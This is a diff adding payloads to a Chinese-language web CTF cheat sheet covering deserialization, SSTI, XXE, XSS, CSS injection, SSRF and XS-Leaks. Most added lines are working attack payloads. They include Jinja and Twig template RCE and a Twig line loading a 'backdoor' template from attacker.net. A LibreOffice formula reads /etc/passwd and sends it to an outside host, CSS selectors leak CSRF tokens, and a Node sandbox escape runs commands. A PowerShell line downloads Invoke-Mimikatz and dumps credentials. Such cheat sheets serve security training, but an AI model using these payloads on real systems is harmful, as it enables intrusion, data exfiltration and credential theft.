+        - 只允許特定 class 被反序列化
+        - 許多 RMI Payload 失效 (即便 classpath 有 gadegt)
+- Codebase
+    - JDK 6u45, 7u21 開始，`useCodebaseOnly` 預設為 true
+        - 禁止自動載入遠端 class 文件
+    - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
+        - RMI 預設不允許從遠端 Codebase 載入 Reference class
+    - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
+        - LDAP 預設不允許從遠端 Codebase 載入 Reference class
+- Tool
+    - [yososerial](https://github.com/frohoff/ysoserial)
+        - URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證
+        - CommonCollections 1~7: Common collections 各版本 gadget chain
+        - ...
+    - [BaRMIe](https://github.com/NickstaDB/BaRMIe)
+        - 專打 Java RMI (enumerating, attacking)
+    - [marshalsec](https://github.com/mbechler/marshalsec)
+    - [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
+        - 分析 Serialization Stream，如Magic頭、serialVersionUID、newHandle等
+    - [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)
+        - Bytecode Analyzer
+        - 找 gadget chain
+    - [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
+        - 透過字典檔配合DNS callback，判斷環境使用哪些library, class等資訊
+- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
+- Example
+    - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
+    - [TrendMicro CTF 2018 Qual - Forensics 300](https://github.com/balsn/ctf_writeup/tree/master/20180914-trendmicroctf#300-3)
+    - [TrendMicro CTF 2019 Qual - Forensics 300](https://github.com/w181496/CTF/tree/master/trendmicro-ctf-2019/forensics300)
+    - TrendMicro CTF 2019 Final - RMIart
 
+
+## .NET Derserialization
+- Tool
+    - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+- asp.net 中 ViewState 以序列化形式保存資料
+    - 有 machinekey 或 viewstate 未加密/驗證時，有機會 RCE
+- Example
+    - [HITCON CTF 2018 - Why so Serials?](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
 
 # SSTI 
 
@@ -1689,7 +2230,21 @@ Server-Side Template Injection
     - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
 - RCE (another way)
-        - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+    - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+- Python3 RCE
+    - ```python
+      {% for c in [].__class__.__base__.__subclasses__() %}
+        {% if c.__name__ == 'catch_warnings' %}
+          {% for b in c.__init__.__globals__.values() %}
+          {% if b.__class__ == {}.__class__ %}
+            {% if 'eval' in b.keys() %}
+              {{ b['eval']('__import__("os").popen("id").read()') }}
+            {% endif %}
+          {% endif %}
+          {% endfor %}
+        {% endif %}
+      {% endfor %}
+      ```
 - 過濾中括號
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
@@ -1701,9 +2256,25 @@ Server-Side Template Injection
     - `{{''.__class__}}`
         - `{{''['__class__']}}`
         - `{{''|attr('__class__')}}`
+- 過濾Keyword
+    - 用`\xff`形式去繞
+    - `{{''["\x5f\x5fclass\x5f\x5f"]}}`
 - 用request繞
     - `{{''.__class__}}`
         - `{{''[request.args.kaibro]}}&kaibro=__class__`
+
+## Twig / Symfony
+
+- RCE
+    - `{{['id']|map('passthru')}}`
+    - `{{['id']|filter('system')}}`
+    - `{{app.request.query.filter(0,'curl${IFS}kaibro.tw',1024,{'options':'system'})}}`
+    - `{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}`
+    - `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+- Read file
+    - `{{'/etc/passwd'|file_excerpt(30)}}`
+- Version
+    - `{{constant('Twig\\Environment::VERSION')}}`
 
 ## AngularJS
 - v1.6後移除Sandbox
@@ -1732,7 +2303,7 @@ Server-Side Template Injection
     userdata = {"user" : "kaibro", "password" : "ggininder" }
     passwd  = raw_input("Password: ")
     if passwd != userdata["password"]:
-        print ("Password " + passwd + " is wrong")
+        print ("Password " + passwd + " is wrong for user %(user)s") % userdata
     ```
 - `f`
     - python 3.6
@@ -1822,6 +2393,13 @@ http://[::]
     - Java原生可列目錄
     - Perl/Ruby open Command Injection
 
+- Libreoffice CVE-2018-6871
+    - 可以使用`WEBSERVICE`讀本地檔案，e.g.`/etc/passwd`
+    - 讀出來可以用http往外傳
+        - `=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`
+        - e.g. DCTF 2018 final, [FBCTF 2019](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/README_en.md)
+    - Example Payload: [Link](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)
+
 ## 遠程利用
 - Gopher
     - 可偽造任意TCP，hen蚌
@@ -1860,11 +2438,19 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Connection Phase
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
+        - Tool: https://github.com/undefinedd/extract0r-
+
+    - Tomcat
+        - 透過 tomcat manager 部署 war
+        - 要先有帳密，可以從 `tomcat-users.xml` 讀，或是踹預設密碼
+        - Tool: https://github.com/pimps/gopher-tomcat-deployer
+        - e.g. [CTFZone 2019 qual - Catcontrol](https://github.com/w181496/CTF/tree/master/CTFZone-2019-qual/Catcontrol)
 
     - Docker 
         - Remote api未授權訪問
             - 開一個container，掛載/root/，寫ssh key
             - 寫crontab彈shell
+            - `docker -H tcp://ip xxxx`
 
     - ImageMagick - CVE-2016-3718
         - 可以發送HTTP或FTP request
@@ -2021,6 +2607,37 @@ xxe.dtd:
 <data>&a4;</data>
 ```
 
+## 串Phar反序列化
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE ernw [ 
+    <!ENTITY xxe SYSTEM "phar:///var/www/html/images/gginin/xxxx.jpeg" > ]>
+    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
+</svg>
+```
+
+- Example: [MidnightSun CTF - Rubenscube](https://github.com/w181496/CTF/tree/master/midnightsun2019/Rubenscube)
+
+## Error-based XXE
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE message[ 
+  <!ELEMENT message ANY >
+  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%NUMBER;
+]> 
+<message>a</message>
+```
+
+- Example: [Google CTF 2019 Qual - bnv](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)
+
 ## 其它
 
 - DOCX
@@ -2029,9 +2646,11 @@ xxe.dtd:
 - PDF
 - https://github.com/BuffaloWill/oxml_xxe
 
-# XSS
+# Frontend
 
-## Basic Payload
+## XSS
+
+### Basic Payload
 
 - `<script>alert(1)</script>`
 - `<svg/onload=alert(1)>`
@@ -2041,7 +2660,7 @@ xxe.dtd:
 - `<iframe src="javascript:alert(1)"></iframe>`
 - ...
 
-## Testing
+### Testing
 
 - `<script>alert(1)</script>`
 - `'"><script>alert(1)</script>`
@@ -2053,7 +2672,7 @@ xxe.dtd:
 - `javascript:alert(1)//`
 - ....
 
-## 繞過
+### 繞過
 
 - `//`(javascript註解)被過濾時，可以利用算數運算符代替
     - `<a href="javascript:alert(1)-abcde">xss</a>`
@@ -2128,7 +2747,21 @@ xxe.dtd:
     - `[a](javascript:window.onerror=alert;throw%201)`
     - ...
 
-- 文件XSS
+- SVG XSS
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+```
+
+- Polyglot XSS
     - Example: PlaidCTF 2018 wave XSS
     - 上傳.wave檔 (會檢查signatures)
       ```
@@ -2140,11 +2773,11 @@ xxe.dtd:
         - wave在apache mime type中沒有被定義
         - `<script src="uploads/this_file.wave">`
 
-## CSP evaluator
+### CSP evaluator
 
 https://csp-evaluator.withgoogle.com/
 
-## Bypass CSP
+### Bypass CSP
 
 - base
     - 改變資源載入的域，引入惡意的js
@@ -2184,13 +2817,13 @@ https://csp-evaluator.withgoogle.com/
     - Google CTF 2018 - gcalc2
 
 
-## Online Encoding / Decoding
+### Online Encoding / Decoding
 - http://monyer.com/demo/monyerjs/
 
-## JSFuck
+### JSFuck
 - http://www.jsfuck.com/
 
-## aaencode / aadecode
+### aaencode / aadecode
 - http://utf-8.jp/public/aaencode.html
 - https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html
 
@@ -2210,6 +2843,59 @@ https://csp-evaluator.withgoogle.com/
             - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                 - CSS會載入`/1/?query={}*{background-color:red}/../../1/`
             - CSS語法容錯率很高
+
+## CSS Injection
+
+- CSS可控時，可以Leak Information
+- Example:
+    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
+    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
+    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
+    - ...
+    - [SECCON CTF 2018 - GhostKingdom](https://github.com/w181496/CTF/tree/master/seccon2018-qual/GhostKingdom)
+
+
+## XS-Leaks
+
+- Cross-Site Browser Side channel attack
+- [xsleaks wiki](https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels)
+
+### Frame count
+- 不同狀態有不同數量的frame
+- 用 `window.frames.length` 來判斷
+    - 狀態A => frame count = x
+    - 狀態B => frame count = y
+    - x != y
+- e.g. [Facebook CTF - Secret Note Keeper](https://github.com/w181496/CTF/tree/master/fbctf2019/secret_note_keeper)
+    - 找到結果 => frame count >= 1
+    - 沒找到 => frame count = 0
+
+### Timing
+- 不同狀態有不同回應時間
+- Time(有結果) > Time(沒結果)
+    - 有結果時，會需要載入比較多東西
+
+### XSS Filter
+- iframe正常訪問，會觸發一次onload事件
+- 在iframe.src尾，加上`#`做請求，正常不會再觸發onload事件
+- 但如果原本頁面被filter block，則會有第二次onload
+    - 第二次請求變成`chrome-error://chromewebdata/#`
+- 可以判斷頁面狀態
+    - 正常 => 1次onload
+    - 被Blocked => 2次onload
+- 也能用`history.length`判斷
+- e.g. 35C3 - filemanager
+
+### HTTP Cache
+- 清空目標 Cache
+    - 送 POST 請求
+- 查詢內容
+    - `<link rel=prerender href="victim.com">`
+- 檢查是否 Cache 該內容
+    - Referrer 設超長，然後訪問該資源
+    - 有 cache => 顯示資源
+    - 沒 cache => 抓不到資源
+
 # 密碼學
 
 ## PRNG
@@ -2328,14 +3014,18 @@ state[i] = state[i-3] + state[i-31]`
      - .DS_Store
      - .htaccess
      - .pyc
+     - package.json
      - server-status
      - crossdomain.xml
      - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
-     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~ / xxx.phps
+     - xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps
      - /WEB-INF/web.xml
  - 文件解析漏洞
      - Apache
          - shell.php.ggininder
+         - shell.php%0a
+            - httpd 2.4.0 to 2.4.29
+            - CVE-2017-15715
      - IIS
          - IIS < 7
              - a.asp/user.jpg
@@ -2384,6 +3074,12 @@ state[i] = state[i-3] + state[i-31]`
         - DNS Server: `1.2.3.4`
         - Test Domain: `abc.com`
 
+- IIS 短檔名列舉
+    - Windows 8.3 格式: `administrator` 可以簡寫成 `admini~1`
+    - 原理：短檔名存在或不存在，伺服器回應內容不同
+    - Tool: https://github.com/irsdl/IIS-ShortName-Scanner
+        - `java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/`
+
 - NodeJS unicode failure
     - 內部使用UCS-2編碼
     - `ＮＮ` => `..`
@@ -2400,6 +3096,14 @@ state[i] = state[i-3] + state[i-31]`
     - 若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷
     - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
 
+- Nginx internal繞過
+    - `X-Accel-Redirect`
+    - [Document](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)
+    - Example: 
+        - Olympic CTF 2014 - CURLing
+        - [MidnightSun CTF 2019 - bigspin](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/#bigspin)
+
+
 - Nginx目錄穿越漏洞
     - 常見於Nginx做Reverse Proxy的狀況
     ```
@@ -2410,14 +3114,58 @@ state[i] = state[i-3] + state[i-31]`
     - 因為`/files`沒有加上結尾`/`，而`/home/`有
     - 所以`/files../`可以訪問上層目錄
 
+- Nginx add_header 
+    - 預設當 repsponse 是 200, 201, 204, 206, 301, 302, 303, 304, 307, or 308 時，`add_header`才會設定 header
+    - e.g. [Codegate 2020 - CSP](https://balsn.tw/ctf_writeup/20200208-codegatectf2020quals/#csp)
+
+- Javascript大小寫特性
+    - `"ı".toUpperCase() == 'I'`
+    - `"ſ".toUpperCase() == 'S'`
+    - `"K".toLowerCase() == 'k'`
+    - [Reference](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
+
 - Node.js目錄穿越漏洞
     - CVE-2017-14849
     - 影響: 8.5.0版
     - `/static/../../../foo/../../../../etc/passwd`
 
+- Node.js vm escape
+    - `const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()`
+    - CONFidence CTF 2020 - TempleJS
+        - Only allow ```/^[a-zA-Z0-9 ${}`]+$/g```
+        - ``` Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` `` ```
 - Apache Tomcat Session操縱漏洞
     - 預設session範例頁面`/examples/servlets /servlet/SessionExample`
     - 可以直接對Session寫入
+
+- polyglot image+.htaccess
+    - XBM格式有定義在`exif_imagetype()`中
+    - 符合`.htaccess`格式
+    - Insomnihack CTF
+    ```
+    #define gg_width 1337
+    #define gg_height 1337
+    AddType application/x-httpd-php .asp
+    ```
+
+- AutoBinding / Mass Assignment
+    - [Mass_Assignment_Cheat_Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md)
+    - Spring MVC
+        - `@ModelAttribute`
+        - 會將Client端傳來的參數(GET/POST)綁定到指定Object中，並自動將此Object加到ModelMap中
+        - Example
+        ```java
+        @RequestMapping(value = "/home", method = RequestMethod.GET)
+            public String home(@ModelAttribute User user, Model model) {
+                if (showSecret){
+                    model.addAttribute("firstSecret", firstSecret);
+                }
+                return "home";
+            }
+        ```
+        - Example 2:
+            - [justiceleague](https://github.com/GrrrDog/ZeroNights-HackQuest-2016)
+        - Example 3: [VolgaCTF 2019 - shop](https://github.com/w181496/CTF/tree/master/volgactf2019_quals/shop)
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
@@ -2475,21 +3223,7 @@ state[i] = state[i-3] + state[i-31]`
 
 - https://buckets.grayhatwarfare.com/
 
-## Social Engineering
-
-- https://leakedsource.ru/
-
-- https://www.shuju666.com/
-
-- http://www.pwsay.com/
-
-- http://www.mimayun.club/
-
-- http://leakbase.pw
-
-- https://haveibeenpwned.com/
-
-## Crack
+## Hash Crack
 
 - http://cmd5.com
 
@@ -2535,12 +3269,40 @@ state[i] = state[i-3] + state[i-31]`
     - http://ceye.io
     - https://www.t00ls.net/dnslog.html
     - http://dnsbin.zhack.ca/
+    - http://requestbin.net/dns
+
+- DNS rebinding
+    - rebind.network
+        - ```
+            # butit still works
+            A.192.168.1.1.forever.rebind.network
+            
+            #alternate between localhost and 10.0.0.1 forever
+            A.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network
+            
+            #first respond with 192.168.1.1 then 192.168.1.2. Now respond 192.168.1.3forever.
+            A.192.168.1.1.1time.192.168.1.2.2times.192.168.1.3.forever.rebind.network
+            
+            #respond with 52.23.194.42 the first time, then whatever `whonow--default-address`
+            # isset to forever after that (default: 127.0.0.1)
+            A.52.23.194.42.1time.rebind.network
+          ```
+  - rbndr.us
+      - `36573657.7f000001.rbndr.us`
 
 - https://r12a.github.io/apps/encodings/
     - Encoding converter 
 
+- http://tool.leavesongs.com/
+
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
+    - powershell 無文件: `powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"`
+
+- WASM
+    - https://wasdk.github.io/WasmFiddle/
+    - https://webassembly.studio/
+    - https://github.com/WebAssembly/wabt
 
 ----
 
